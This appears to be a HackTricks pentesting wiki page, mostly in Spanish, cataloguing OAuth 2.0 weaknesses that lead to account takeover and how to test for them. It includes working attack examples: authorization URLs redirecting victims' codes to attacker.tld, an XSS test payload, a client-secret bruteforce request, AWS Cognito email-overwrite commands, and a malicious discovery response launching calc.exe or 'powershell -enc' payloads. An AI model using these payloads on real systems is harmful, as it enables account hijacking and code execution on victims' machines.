# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Información básica <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.

Es esencial comprender los siguientes componentes dentro del framework OAuth 2.0:

- **resource owner**: Tú, como el **usuario/entidad**, autorizas el acceso a tu recurso, por ejemplo, los posts de tu cuenta en redes sociales.
- **resource server**: El **servidor que gestiona las peticiones autenticadas** después de que la aplicación haya obtenido un `access token` en nombre del `resource owner`, p. ej., **https://socialmedia.com**.
- **client application**: La **aplicación que solicita autorización** al `resource owner`, como **https://example.com**.
- **authorization server**: El **servidor que emite `access tokens`** a la `client application` tras la autenticación del `resource owner` y la concesión de autorización, p. ej., **https://socialmedia.com**.
- **client_id**: Un identificador público y único para la aplicación.
- **client_secret:** Una clave confidencial, conocida solo por la aplicación y el authorization server, utilizada para generar `access_tokens`.
- **response_type**: Un valor que especifica **el tipo de token solicitado**, por ejemplo `code`.
- **scope**: El **nivel de acceso** que la `client application` está solicitando al `resource owner`.
- **redirect_uri**: La **URL a la que se redirige al usuario después de la autorización**. Normalmente debe coincidir con la URL de redirección pre-registrada.
- **state**: Un parámetro para **mantener datos durante la redirección del usuario hacia y desde el authorization server**. Su unicidad es crítica para funcionar como mecanismo de protección CSRF.
- **grant_type**: Un parámetro que indica **el tipo de grant y el tipo de token que se devolverá**.
- **code**: El código de autorización emitido por el `authorization server`, utilizado junto con `client_id` y `client_secret` por la client application para obtener un `access_token`.
- **access_token**: El **token que la client application usa para peticiones API** en nombre del `resource owner`.
- **refresh_token**: Permite a la aplicación **obtener un nuevo `access_token` sin volver a solicitar la autorización al usuario**.

### Flujo

El **flujo real de OAuth** procede de la siguiente manera:

1. Navegas a [https://example.com](https://example.com) y seleccionas el botón “Integrar con redes sociales”.
2. El sitio envía una solicitud a [https://socialmedia.com](https://socialmedia.com) pidiendo tu autorización para que la aplicación de https://example.com acceda a tus posts. La solicitud está estructurada como:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. A continuación se te presenta una página de consentimiento.
4. Tras tu aprobación, Social Media envía una respuesta al `redirect_uri` con los parámetros `code` y `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utiliza este `code`, junto con su `client_id` y `client_secret`, para realizar una solicitud del lado del servidor para obtener un `access_token` en tu nombre, permitiendo el acceso a los permisos a los que consentiste:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, el proceso concluye cuando https://example.com emplea tu `access_token` para hacer una llamada API a una red social y acceder

## Vulnerabilidades <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), el servidor de autorización debe redirigir el navegador únicamente a redirect URIs exactas y pre-registradas. Cualquier debilidad aquí permite a un atacante enviar a una víctima a través de una URL de autorización maliciosa de modo que el IdP entregue el `code` (y el `state`) de la víctima directamente a un endpoint del atacante, que luego puede canjearlo y recolectar tokens.

Flujo típico de ataque:

1. Forjar `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` y enviarlo a la víctima.
2. La víctima se autentica y aprueba los scopes.
3. El IdP redirige a `attacker.tld/callback?code=<victim-code>&state=...` donde el atacante registra la petición y canjea inmediatamente el `code`.

Errores comunes de validación para probar:

- **No validation** – se acepta cualquier URL absoluta, resultando en el robo inmediato del `code`.
- **Weak substring/regex checks on the host** – se puede bypassear con dominios lookalike como `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, o `match.com@evil.com`.
- **IDN homograph mismatches** – la validación ocurre sobre la forma punycode (`xn--`), pero el navegador redirige al dominio Unicode controlado por el atacante.
- **Arbitrary paths on an allowed host** – apuntar `redirect_uri` a `/openredirect?next=https://attacker.tld` o a cualquier endpoint XSS/contenido de usuario filtra el `code` ya sea a través de redirecciones encadenadas, cabeceras Referer, o JavaScript inyectado.
- **Directory constraints without normalization** – patrones como `/oauth/*` se pueden bypassear con `/oauth/../anything`.
- **Wildcard subdomains** – aceptar `*.example.com` significa que cualquier takeover (dangling DNS, S3 bucket, etc.) proporciona inmediatamente un callback válido.
- **Non-HTTPS callbacks** – permitir URIs `http://` da a atacantes en la red (Wi‑Fi, proxy corporativo) la oportunidad de capturar el `code` en tránsito.

Revisa también parámetros auxiliares de estilo redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) y el OpenID discovery document (`/.well-known/openid-configuration`) por endpoints adicionales que podrían heredar los mismos bugs de validación.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Como se menciona en este informe de bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), podría ser posible que la URL de redirección sea reflejada en la respuesta del servidor después de que el usuario se autentique, siendo vulnerable a XSS. Payload posible para probar:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Manejo inapropiado del parámetro state <a href="#bda5" id="bda5"></a>

El parámetro `state` es el CSRF token del Authorization Code flow: el cliente debe generar un **valor criptográficamente aleatorio por instancia de navegador**, persistirlo en un lugar que solo ese navegador pueda leer (cookie, local storage, etc.), enviarlo en la solicitud de autorización y rechazar cualquier respuesta que no devuelva el mismo valor. Siempre que el valor sea estático, predecible, opcional o no esté ligado a la sesión del usuario, el atacante puede completar su propio flujo OAuth, capturar la petición final `?code=` (sin reenviarla) y luego forzar al navegador de la víctima a reproducir esa petición para que la cuenta de la víctima quede vinculada al perfil del atacante en el identity provider.

El patrón de replay siempre es el mismo:

1. El atacante se autentica contra el IdP con su cuenta e intercepta el último redirect que contiene `code` (y cualquier `state`).
2. Descarta esa petición, conserva la URL y más tarde abusa de cualquier primitiva CSRF (enlace, iframe, formulario que se autoenvía) para forzar al navegador de la víctima a cargarla.
3. Si el cliente no hace cumplir `state`, la aplicación consume el resultado de autorización del atacante y autentica al atacante en la cuenta de la víctima en la app.

Lista práctica de verificación para el manejo de `state` durante las pruebas:

- **Falta totalmente `state`** – si el parámetro nunca aparece, todo el login es susceptible a CSRF.
- **`state` no requerido** – elimínalo de la petición inicial; si el IdP sigue emitiendo códigos que el cliente acepta, la defensa es opt-in.
- **`state` retornado no validado** – manipula el valor en la respuesta (Burp, MITM proxy). Aceptar valores no coincidentes significa que el token almacenado nunca se compara.
- **`state` predecible o puramente basado en datos** – muchas apps meten rutas de redirect o blobs JSON en `state` sin mezclar entropía, permitiendo a atacantes adivinar valores válidos y reproducir flujos. Siempre anteponer/adjuntar entropía fuerte antes de codificar datos.
- **Fijación de `state`** – si la app permite a usuarios suministrar el valor de `state` (p. ej., vía URLs de autorización manipuladas) y lo reutiliza durante el flujo, un atacante puede fijar un valor conocido y reutilizarlo contra víctimas.

PKCE puede complementar a `state` (especialmente para public clients) ligando el authorization code a un code verifier, pero los clientes web aún deben rastrear `state` para prevenir bugs de CSRF/enlace de cuentas entre usuarios.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Sin verificación de correo en la creación de cuentas**: Los atacantes pueden crear preventivamente una cuenta usando el correo de la víctima. Si la víctima luego usa un servicio de terceros para iniciar sesión, la aplicación podría vincular inadvertidamente esa cuenta de terceros con la cuenta precreada por el atacante, provocando acceso no autorizado.
2. **Explotar verificación laxa de correo en OAuth**: Los atacantes pueden explotar servicios OAuth que no verifican correos registrándose en su servicio y luego cambiando el email de la cuenta al de la víctima. Este método conlleva riesgos similares de acceso no autorizado, parecido al primer escenario pero por un vector distinto.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

El `client_id` es intencionalmente público, pero el **`client_secret` nunca debe ser recuperable por usuarios finales**. Despliegues de Authorization Code que incrustan el secret en **mobile APKs, desktop clients, o single-page apps** entregan efectivamente esa credencial a cualquiera que pueda descargar el paquete. Siempre inspecciona public clients mediante:

- Desempaquetar el APK/IPA, instalador de escritorio o app Electron y buscar (`grep`) por `client_secret`, blobs Base64 que decodifiquen a JSON, o endpoints OAuth hard-codeados.
- Revisar archivos de configuración incluidos (plist, JSON, XML) o strings decompiladas en busca de credenciales de cliente.

Una vez que el atacante extrae el secret solo necesita robar cualquier `code` de autorización de una víctima (vía un `redirect_uri` débil, logs, etc.) para llamar independientemente a `/token` y acuñar access/refresh tokens sin involucrar a la app legítima. Trata a public/native clients como **incapaces de guardar secretos**—deberían en su lugar confiar en PKCE (RFC 7636) para probar la posesión de un code verifier por instancia en vez de un secret estático. Durante las pruebas, confirma si PKCE es obligatorio y si el backend realmente rechaza intercambios de token que omiten bien el `client_secret` **o** un `code_verifier` válido.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Artefactos Referer/Header/Location que leak Code + State

Una vez que el cliente tiene el **code and state**, si aparecen en **`location.href`** o **`document.referrer`** y se reenvían a terceros, leak. Dos patrones recurrentes:

- **Classic Referer leak**: después del redirect de OAuth, cualquier navegación que mantenga `?code=&state=` en la URL los colocará en el header **Referer** enviado a CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: algunos SDKs (pixels/JS loggers) reaccionan a eventos `postMessage` y luego **envían el `location.href`/`referrer` actual a APIs backend usando un token suministrado en el mensaje**. Si puedes inyectar tu propio token en ese flujo (p. ej., vía un postMessage relay controlado por el atacante), después podrás leer el historial/registros de peticiones de la API del SDK y recuperar los artefactos OAuth de la víctima embebidos en esas peticiones.

### Access Token Stored in Browser History

La garantía central del Authorization Code grant es que **access tokens nunca llegan al navegador del resource owner**. Cuando las implementaciones leak tokens del lado del cliente, cualquier bug menor (XSS, Referer leak, proxy logging) se convierte en compromiso instantáneo de cuentas. Revisa siempre:

- **Tokens in URLs** – si `access_token` aparece en la query/fragment, queda en el historial del navegador, logs de servidor, analytics y en los headers Referer enviados a terceros.
- **Tokens transiting untrusted middleboxes** – devolver tokens sobre HTTP o a través de proxies de depuración/corporativos permite a observadores de red capturarlos directamente.
- **Tokens stored in JavaScript state** – stores de React/Vue, variables globales o blobs JSON serializados exponen tokens a cualquier script del origin (incluyendo payloads XSS o extensiones maliciosas).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retienen tokens mucho después del logout en dispositivos compartidos y son accesibles por scripts.

Cualquiera de estos hallazgos suele elevar bugs “bajos” (como un CSP bypass o DOM XSS) a un takeover completo de API porque el atacante puede simplemente leer y reproducir el leaked bearer token.

### Everlasting Authorization Code

Los authorization codes deben ser **de corta duración, de un solo uso y con manejo contra replay**. Al evaluar un flujo, captura un `code` y:

- **Test the lifetime** – RFC 6749 recomienda minutos, no horas. Intenta canjear el code después de 5–10 minutos; si aún funciona, la ventana de exposición para cualquier code leak es excesiva.
- **Test sequential reuse** – envía el mismo `code` dos veces. Si la segunda petición devuelve otro token, los atacantes pueden clonar sesiones indefinidamente.
- **Test concurrent redemption/race conditions** – lanza dos peticiones de token en paralelo (Burp intruder, turbo intruder). Emisores débiles a veces conceden ambos.
- **Observe replay handling** – un intento de reutilización no solo debería fallar sino también revocar cualquier token ya emitido a partir de ese code. De lo contrario, un replay detectado deja activo el primer token del atacante.

Combinar un code susceptible a replay con cualquier `redirect_uri` o bug de logging permite acceso persistente a cuentas incluso después de que la víctima complete el login legítimo.

### Authorization/Refresh Token not bound to client

Si puedes obtener el **authorization code** y **canjearlo por un cliente/app distinto**, puedes tomar control de otras cuentas. Prueba binding débil mediante:

- Capturar un `code` para **app A** y enviarlo al token endpoint de **app B**; si aún recibes un token, el audience binding está roto.
- Probar endpoints de minting de tokens first-party que deberían estar restringidos a sus propios client IDs; si aceptan `state`/`app_id` arbitrarios mientras solo validan el code, efectivamente realizas un **authorization-code swap** para acuñar tokens first-party con más privilegios.
- Comprobar si el client binding ignora desajustes de nonce/redirect URI. Si una página de error sigue cargando SDKs que loguean `location.href`, combínalo con Referer/telemetry leaks para robar codes y canjearlos en otro lugar.

Cualquier endpoint que intercambie `code` → token **debe** verificar el client emisor, el redirect URI y el nonce; de lo contrario, un code robado de cualquier app puede escalarse a un access token first-party.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) puedes ver que el **token** que **AWS Cognito** devuelve al usuario podría tener **suficientes permisos para sobrescribir los datos del usuario**. Por tanto, si puedes **cambiar el email de un usuario por otro email**, podrías llegar a **tomar control** de las cuentas de otros.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Para más información detallada sobre cómo abusar de AWS Cognito consulta [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Como [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), los flujos OAuth que esperan recibir el **token** (y no un code) podrían ser vulnerables si no verifican que el token pertenece a la app.

Esto es porque un **attacker** podría crear una **application supporting OAuth and login with Facebook** (por ejemplo) en su propia aplicación. Entonces, una vez que una victim hace login con Facebook en la **attackers application**, el attacker podría obtener el **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Por lo tanto, si el attacker consigue que el user acceda a su propia OAuth application, será capaz de take over la victims account en aplicaciones que están esperando un token y no comprueban si el token fue concedido a su app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era posible hacer que una victim abriera una página con un **returnUrl** apuntando al attackers host. Esta información sería **stored in a cookie (RU)** y en un **later step** el **prompt** preguntaría al **user** si quiere dar acceso a ese attackers host.

Para bypassar este prompt, era posible abrir una pestaña para iniciar el **Oauth flow** que establecería esta cookie RU usando el **returnUrl**, cerrar la pestaña antes de que se muestre el prompt, y abrir una nueva pestaña sin ese valor. Entonces, el **prompt won't inform about the attackers host**, pero la cookie quedaría configurada hacia él, de modo que el **token will be sent to the attackers host** en la redirección.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), algunas implementaciones OAuth permiten indicar el parámetro GET **`prompt`** como None (**`&prompt=none`**) para **prevent users being asked to confirm** el acceso dado en un prompt en la web si ya están loggeados en la plataforma.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), podría ser posible indicar el parámetro **`response_mode`** para indicar dónde quieres que se entregue el code en la URL final:

- `response_mode=query` -> El code se proporciona dentro de un parámetro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> El code se proporciona dentro del fragmento de la URL: `#code=2397rf3gu93f`
- `response_mode=form_post` -> El code se proporciona dentro de un formulario POST con un input llamado `code` y su valor
- `response_mode=web_message` -> El code se envía en un post message: `window.opener.postMessage({"code": "asdasdasd..."`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs son objetivos ideales para clickjacking: si pueden ser framed, un attacker puede superponer gráficos personalizados, ocultar los botones reales y engañar a los users para que aprueben scopes peligrosos o vinculen cuentas. Construye PoCs que:

1. Carguen la IdP authorization URL dentro de un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usen posicionamiento absoluto/trucos de opacidad para alinear botones falsos con los controles ocultos **Allow**/**Approve**.
3. Opcionalmente prellenar parámetros (scopes, redirect URI) para que la aprobación robada beneficie inmediatamente al attacker.

Durante las pruebas verifica que las páginas IdP emitan `X-Frame-Options: DENY/SAMEORIGIN` o una `Content-Security-Policy: frame-ancestors 'none'` restrictiva. Si ninguna está presente, demuestra el riesgo con herramientas como [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) y registra lo fácil que una victim autoriza la app del attacker. Para ideas de payload adicionales consulta [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), este es un OAuth flow que permite hacer login en OAuth vía **username** y **password**. Si durante este flujo simple se devuelve un **token** con acceso a todas las acciones que el user puede realizar, entonces es posible bypassar 2 FA usando ese token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) explica cómo fue posible abusar de un **open redirect** usando el valor del **referrer** para llevar de OAuth a ATO. El ataque fue:

1. Victim accede a la web del attacker
2. La victim abre el enlace malicioso y un opener inicia el Google OAuth flow con `response_type=id_token,code&prompt=none` como parámetros adicionales usando como **referrer the attackers website**.
3. En el opener, después de que el provider autoriza a la victim, la envía de vuelta al valor del parámetro `redirect_uri` (web de la victim) con un código 30X que aún mantiene al attackers website en el referer.
4. La victim website trigger the open redirect based on the referrer redirigiendo al user victim al attackers website; como el **`respose_type`** era **`id_token,code`**, el code será enviado de vuelta al attacker en el **fragment** de la URL permitiéndole tacke over la cuenta del user vía Google en el sitio de la victim.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration en OAuth actúa como un vector menos obvio pero crítico para vulnerabilidades de seguridad, específicamente para ataques de **Server-Side Request Forgery (SSRF)**. Este endpoint permite a los servidores OAuth recibir detalles sobre client applications, incluyendo URLs sensibles que podrían ser explotadas.

Key Points:

- **Dynamic Client Registration** suele mapearse a `/register` y acepta detalles como `client_name`, `client_secret`, `redirect_uris`, y URLs para logos o JSON Web Key Sets (JWKs) vía POST.
- Esta característica sigue las especificaciones de **RFC7591** y **OpenID Connect Registration 1.0**, que incluyen parámetros potencialmente vulnerables a SSRF.
- El proceso de registro puede exponer inadvertidamente a los servidores a SSRF de varias maneras:
- **`logo_uri`**: Una URL para el logo del client que el servidor podría fetch, desencadenando SSRF o llevando a XSS si la URL se maneja mal.
- **`jwks_uri`**: Una URL al documento JWK del client, que si se craftea maliciosamente puede hacer que el servidor haga requests salientes a un servidor controlado por el attacker.
- **`sector_identifier_uri`**: Referencia un array JSON de `redirect_uris`, que el servidor podría fetchar, creando una oportunidad SSRF.
- **`request_uris`**: Lista de request URIs permitidas para el client, que puede ser explotada si el servidor fetcha estas URIs al inicio del proceso de autorización.

Exploitation Strategy:

- SSRF puede ser trigger by registrando un nuevo client con URLs maliciosas en parámetros como `logo_uri`, `jwks_uri`, o `sector_identifier_uri`.
- Mientras la explotación directa vía `request_uris` puede mitigarse con controles de whitelist, suministrar un `request_uri` pre-registrado y controlado por el attacker puede facilitar SSRF durante la fase de autorización.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

La investigación sobre [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impactando clients `mcp-remote` como Claude Desktop, Cursor o Windsurf) muestra cómo **dynamic OAuth discovery se convierte en un primitive de RCE** siempre que el client reenvíe metadata del IdP directamente al sistema operativo. El servidor remoto MCP devuelve un `authorization_endpoint` controlado por el attacker durante el intercambio de discovery (`/.well-known/openid-configuration` o cualquier metadata RPC). `mcp-remote ≤0.1.15` entonces llamaría al system URL handler (`start`, `open`, `xdg-open`, etc.) con la cadena recibida, por lo que cualquier scheme/path soportado por el OS se ejecutaría localmente.

Attack workflow

1. Apunta el desktop agent a un MCP/OAuth server hostil (`npx mcp-remote https://evil`). El agent recibe `401` más metadata.
2. El server responde con JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. El cliente lanza el manejador del SO para la URI suministrada. Windows acepta payloads como `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux aceptan `file:///Applications/Calculator.app/...` o incluso esquemas personalizados como `cmd://bash -lc '<payload>'` si están registrados.
4. Dado que esto ocurre antes de cualquier interacción del usuario, **simplemente configurar el cliente para que hable con el servidor del atacante produce ejecución de código**.

**How to test**

- Apunta a cualquier desktop/agent con capacidad OAuth que realice discovery sobre HTTP(S) y abra endpoints devueltos localmente (Electron apps, CLI helpers, thick clients).
- Intercepta u hospeda la respuesta de discovery y reemplaza `authorization_endpoint`, `device_authorization_endpoint`, o campos similares por `file://`, `cmd://`, rutas UNC u otros esquemas peligrosos.
- Observa si el cliente valida el scheme/host. La falta de validación resulta en ejecución inmediata bajo el contexto del usuario y prueba el problema.
- Repite con diferentes esquemas para mapear la superficie de ataque completa (p. ej., `ms-excel:`, `data:text/html,`, custom protocol handlers) y demuestra el alcance multiplataforma.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the `sub` field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in `sub`) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as `client_id` and `scope`, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
